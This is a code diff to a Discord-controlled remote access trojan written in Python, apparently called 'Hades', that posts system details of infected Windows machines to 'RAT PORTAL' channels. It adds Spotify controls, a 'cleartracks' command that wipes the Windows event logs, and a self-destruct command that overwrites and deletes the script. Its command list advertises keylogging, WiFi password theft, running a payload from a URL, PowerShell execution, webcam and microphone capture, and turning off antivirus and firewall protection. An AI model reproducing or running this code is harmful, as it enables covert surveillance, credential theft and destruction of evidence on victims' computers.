@@ -13,6 +13,7 @@ import winreg
 import pyautogui
 from io import BytesIO
 import urllib.parse
+import websockets
 import win32com.client as wincl 
 import asyncio
 import base64
@@ -59,14 +60,29 @@ import ctypes
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from ctypes import Structure, c_uint, c_int, sizeof, windll, byref
 import win32com.client as wincl
+import socket
+import asyncio
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import discord
+from discord.ext import commands
+from pypresence import Presence
+import spotipy
+from spotipy.oauth2 import SpotifyOAuth
+
+# Spotify credentials
+SPOTIPY_CLIENT_ID = 'CLIENT_ID'
+SPOTIPY_CLIENT_SECRET = 'CLIENT_SECERET_ID'
+SPOTIPY_REDIRECT_URI = 'https://localhost:8000'
 
 
-
-
-
+# Set up Spotify API authentication
+sp_oauth = SpotifyOAuth(client_id=SPOTIPY_CLIENT_ID,
+                        client_secret=SPOTIPY_CLIENT_SECRET,
+                        redirect_uri=SPOTIPY_REDIRECT_URI,
+                        scope="user-read-playback-state user-modify-playback-state")
 # Initialize intents
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix='/', intents=intents)
 
 # Feature: PUBLIC IP ADDRESS FETCH
 def get_public_ip():
@@ -79,10 +95,11 @@ def get_public_ip():
         print(f"Request failed: {e}")
         return 'N/A'
 
+
 # Feature: CREATE CATEGORY & CHANNELS
 @bot.event
 async def on_ready():
-    print(f'Bot connected as {bot.user.name}')
+    print(f'Hades synced as {bot.user.name}')
     for guild in bot.guilds:
         # Check if the category and channels already exist
         category = discord.utils.get(guild.categories, name='═══ ・➣ 🐀 RAT PORTAL・')
@@ -102,7 +119,8 @@ async def on_ready():
             for name in channel_names:
                 await guild.create_text_channel(name, category=category)
 
-        # Get system information
+
+         # Get system information
         system_name = socket.gethostname()
         public_ip = get_public_ip()
         try:
@@ -124,33 +142,49 @@ async def on_ready():
             embed.set_footer(text=footer_text)
 
             await device_logs_channel.send(embed=embed)
-
 # Command descriptions
 command_descriptions = {
-    "cam_list": "Displays a list of available webcams.",
-    "!camic [cam_id]": "Takes a shot with the default webcam or the specified webcam ID.",
-    "!clear <count>": "Clears the specified number of messages in the current chat.",
-    "!download <path>": "Downloads a file from the specified URL and saves it to the provided path.",
-    "!grab_wifi": "Grabs saved WiFi passwords on the device.",
-    "!help": "Shows a message containing the list of commands and their descriptions.",
-    "!kill_process": "Terminates a specified process by name.",
-    "!list_process": "Lists all currently running processes.",
-    "!ping": "Checks if the bot is online and responsive.",
-    "!powershell <cmd>": "Executes the provided PowerShell command.",
-    "!bot_down": "Shuts down the bot.",
-    "!voice_get 20": "Gets audio recorded from the system where 20 represents the duration in seconds.",
-    "!!stopscreen": "Stops a screenshot of the current screen.",
-    "!set_payload <url>": "Automatically executes and deletes a payload from the provided URL.",
-    "!sys_info": "Retrieves and displays system information.",
-    "!sys_log": "Retrieves and displays system logs.",
-    "!sys_restart": "Restarts the system.",
-    "!sys_shutdown": "Shuts down the system.",
-    "!streamscreen": "Sends the screenshot and sends."
+ "/!streamscreen": "Sends the screenshot and sends.",
+    "/powershell": "Executes commands using PowerShell.",
+    "/bot_commmand": "Executes a command related to a bot.",
+    "/sys_log": "Logs system activities.",
+    "/lock_sys": "Locks the system.",
+    "/set_payload": "Sets a payload for execution.",
+    "/grab_wifi": "Grabs WiFi information.",
+    "/download": "Downloads a specified file.",
+    "/cam_list": "Lists connected cameras.",
+    "/list_process": "Lists running processes.",
+    "/kill_process": "Terminates a specified process.",
+    "/rat_down": "Initiates a remote access tool download.",
+    "/sys_restart": "Restarts the system.",
+    "/clear": "Clears the current operation.",
+    "/voice_rec": "Initiates voice recognition. (Duration must be a positive integer.)",
+    "/start_keylogger": "Starts recording keystrokes.",
+    "/recscreen": "Records the screen. (Invalid duration. Please specify a valid number after '!recscreen')",
+    "/disableantivirus": "Disables antivirus protection.",
+    "/disablefirewall": "Disables firewall protection.",
+    "/start_server": "Starts a server.",
+    "/websocket_server": "Starts a WebSocket server.",
+    "/now_playing": "Gets the current song playing in Spotify.",
+    "/play": "Plays a song in Spotify. (Example: /play faded)",
+    "/pause": "Pauses the current song in Spotify.",
+    "/resume": "Resumes playback of the current song in Spotify.",
+    "/next": "Plays the next song in the Spotify playlist.",
+    "/previous": "Plays the previous song in the Spotify playlist.",
+    "/like": "Likes the current song in Spotify.",
+    "/battery": "Retrieves battery status.",
+    "/cleartracks": "Clears tracks and logs.",
+    "/self_destruct": "Initiates self-destruction.",
+    "/ping": "Sends a ping to check status.",
+    "/sys_info": "Retrieves system information.",
+    "/screen_share": "Shares the screen.",
+    "/start_logging": "Starts logging activities.",
+    "/camic [cam_id]": "Takes a shot with the default webcam or the specified webcam ID."
 }
 
 # Bot help command
-@bot.command(name='bot_help')
-async def bot_help(ctx):
+@bot.command(name='bot_commands')
+async def bot_commands(ctx):
     help_message = "**Available Commands:**\n\n"
     for command, description in command_descriptions.items():
         help_message += f"{command}: {description}\n\n"
@@ -483,7 +517,7 @@ async def voice_rec(ctx, duration: int):
     sf.write(filename, recording, fs)
 
     #Send the recorded audio to a specific text channel
-    text_channel_id =   1236994695180062720
+    text_channel_id =   ENTER_CHANNEL_ID
     text_channel = bot.get_channel(text_channel_id)
     if text_channel:
         await text_channel.send(file=discord.File(filename))
@@ -607,6 +641,229 @@ async def disablefirewall(ctx):
         await ctx.send("[*] Windows Firewall disabled successfully.")
     else:
         await ctx.send("[*] This command requires admin privileges.")
+
+
+@bot.command()
+async def start_server(ctx):
+    # Create an asyncio loop for the web server and WebSocket server
+    loop = asyncio.get_event_loop()
+
+    # Create and start the web server
+    async def web_server():
+        app = web.Application()
+        async def hello(request):
+            return web.Response(text="Hello, world")
+        app.add_routes([web.get('/', hello)])
+        runner = web.AppRunner(app)
+        await runner.setup()
+        site = web.TCPSite(runner, 'localhost', 8080)
+        await site.start()
+        await ctx.send("Web server started at http://localhost:8080")
+
+    # Create and start the WebSocket server
+    @bot.command()
+    async def websocket_server(websocket, path):
+        while True:
+            message = await websocket.recv()
+            print(f"Received message: {message}")
+            await websocket.send(f"Echo: {message}")
+
+    # Run both servers concurrently
+    loop.create_task(web_server())
+    start_server = websockets.serve(websocket_server, "localhost", 8765)
+    loop.run_until_complete(start_server)
+    await ctx.send("WebSocket server started at ws://localhost:8765")
+
+
+@bot.command()
+async def now_playing(ctx):
+    try:
+        sp = spotipy.Spotify(auth_manager=sp_oauth)  # Initialize Spotify object here
+        current_track = sp.current_playback()
+        if current_track and current_track['is_playing']:
+            track_name = current_track['item']['name']
+            artists = ', '.join([artist['name'] for artist in current_track['item']['artists']])
+            album_name = current_track['item']['album']['name']
+            album_cover_url = current_track['item']['album']['images'][0]['url']  # Get the URL of the first image (usually thumbnail)
+
+            embed = discord.Embed(title='Now Playing', description=f'{track_name} by {artists}', color=discord.Color.green())
+            embed.set_thumbnail(url=album_cover_url)
+            embed.add_field(name='Album', value=album_name, inline=False)
+
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send('No track is currently playing.')
+    except spotipy.exceptions.SpotifyException as e:
+        print(f"Spotify API Error: {e}")
+        await ctx.send('Error retrieving current playback.')
+
+
+
+@bot.command()
+async def play(ctx, *, song_name):
+    try:
+        sp = spotipy.Spotify(auth_manager=sp_oauth)
+        results = sp.search(q=song_name, limit=1, type='track')
+
+        if results['tracks']['items']:
+            track_uri = results['tracks']['items'][0]['uri']
+            sp.start_playback(uris=[track_uri])
+            await ctx.send(f'Now playing: {results["tracks"]["items"][0]["name"]} by {", ".join([artist["name"] for artist in results["tracks"]["items"][0]["artists"]])}')
+        else:
+            await ctx.send(f'Could not find the song: {song_name}')
+    except spotipy.exceptions.SpotifyException as e:
+        print(f"Spotify API Error: {e}")
+        await ctx.send('Error playing the song.')
+
+@bot.command()
+async def pause(ctx):
+    try:
+        sp = spotipy.Spotify(auth_manager=sp_oauth)
+        sp.pause_playback()
+        await ctx.send('Playback paused.')
+    except spotipy.exceptions.SpotifyException as e:
+        print(f"Spotify API Error: {e}")
+        await ctx.send('Error pausing the playback.')
+
+@bot.command()
+async def resume(ctx):
+    try:
+        sp = spotipy.Spotify(auth_manager=sp_oauth)
+        sp.start_playback()
+        await ctx.send('Playback resumed.')
+    except spotipy.exceptions.SpotifyException as e:
+        print(f"Spotify API Error: {e}")
+        await ctx.send('Error resuming the playback.')
+
+@bot.command()
+async def next(ctx):
+    try:
+        sp = spotipy.Spotify(auth_manager=sp_oauth)
+        sp.next_track()
+        await ctx.send('Playing next track.')
+    except spotipy.exceptions.SpotifyException as e:
+        print(f"Spotify API Error: {e}")
+        await ctx.send('Error skipping to the next track.')
+
+@bot.command()
+async def previous(ctx):
+    try:
+        sp = spotipy.Spotify(auth_manager=sp_oauth)
+        sp.previous_track()
+        await ctx.send('Playing previous track.')
+    except spotipy.exceptions.SpotifyException as e:
+        print(f"Spotify API Error: {e}")
+        await ctx.send('Error skipping to the previous track.')
+
+@bot.command()
+async def like(ctx):
+    try:
+        sp = spotipy.Spotify(auth_manager=sp_oauth)
+        current_playback = sp.current_playback()
+
+        if current_playback and 'item' in current_playback and current_playback['item']:
+            track_id = current_playback['item']['id']
+            sp.current_user_saved_tracks_add([track_id])
+            await ctx.send(f'Liked the track: {current_playback["item"]["name"]}')
+        else:
+            await ctx.send('No track is currently playing.')
+    except spotipy.exceptions.SpotifyException as e:
+        print(f"Spotify API Error: {e}")
+        await ctx.send('Error liking the track.')
+
+
+
+
+def get_battery_status():
+    battery = psutil.sensors_battery()
+    
+    if battery is None:
+        return "Battery information not available."
+
+    charge_percent = battery.percent
+    is_plugged = battery.power_plugged
+
+    charging_state = "Charging" if is_plugged else "Not Charging"
+
+    return f"Battery charge: {charge_percent}%\nCharging state: {charging_state}"
+
+@bot.command()
+async def battery(ctx):
+    status = get_battery_status()
+    await ctx.send(status)
+def clear_log_file(log_file_path):
+    with open(log_file_path, 'w'):
+        pass
+
+def delete_file(file_path):
+    if os.path.exists(file_path):
+        os.remove(file_path)
+        return f"Deleted file: {file_path}"
+    else:
+        return f"File not found: {file_path}"
+
+def clear_logs():
+    try:
+        # Example for clearing system logs on Windows
+        subprocess.run(["wevtutil", "cl", "Application"], check=True, capture_output=True, text=True)
+        subprocess.run(["wevtutil", "cl", "Security"], check=True, capture_output=True, text=True)
+        subprocess.run(["wevtutil", "cl", "System"], check=True, capture_output=True, text=True)
+        return "Cleared system event logs."
+    except subprocess.CalledProcessError as e:
+        return f"Error clearing system logs: {e.stderr.strip()}"
+
+@bot.command()
+async def cleartracks(ctx):
+    try:
+        clear_logs_msg = clear_logs()
+        await ctx.send(f"Cleared all logs and system event logs.\n{clear_logs_msg}")
+    except Exception as e:
+        await ctx.send(f"Failed to clear logs. Make sure to run the bot as administrator on Windows. Error: {str(e)}")
+
+
+
+
+
+
+
+
+
+@bot.command()
+async def self_destruct(ctx):
+    await ctx.send('Initiating self-destruction sequence...')
+    
+    # Remove script file (be cautious with this step)
+    script_file = __file__
+    if os.path.exists(script_file):
+        # Overwrite the file content with random data to make recovery difficult
+        with open(script_file, 'wb') as f:
+            f.write(os.urandom(1024))
+        os.remove(script_file)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -908,13 +1165,18 @@ async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
 #error handling
 @bot.event
 async def on_command_error(ctx, error):
-    channel = discord.utils.get(bot.get_all_channels(), name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')
+    # Fetch the desired channel
+    channel = discord.utils.get(ctx.guild.channels, name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')
 
-    # Log the command error
-    if isinstance(error, commands.CommandNotFound):
-        error_message = f"Command `{ctx.message.content}` is not found"
+    if channel is not None:
+        # Log the command error
+        if isinstance(error, commands.CommandNotFound):
+            error_message = f"Command `{ctx.message.content}` is not found"
+        else:
+            error_message = f"An error occurred in command '{ctx.message.content}': {error}"
+
+        await channel.send(error_message)
     else:
-        error_message = f"An error occurred in command '{ctx.message.content}': {error}"
-
+        print(f"Error channel '・🔔│ʀᴀᴛ-ʟᴏɢꜱ' not found or bot doesn't have access.")
 # Run the bot with the token
-bot.run("YOUR TOKEN ")
+bot.run("YOUR_BOT_TOKEN")
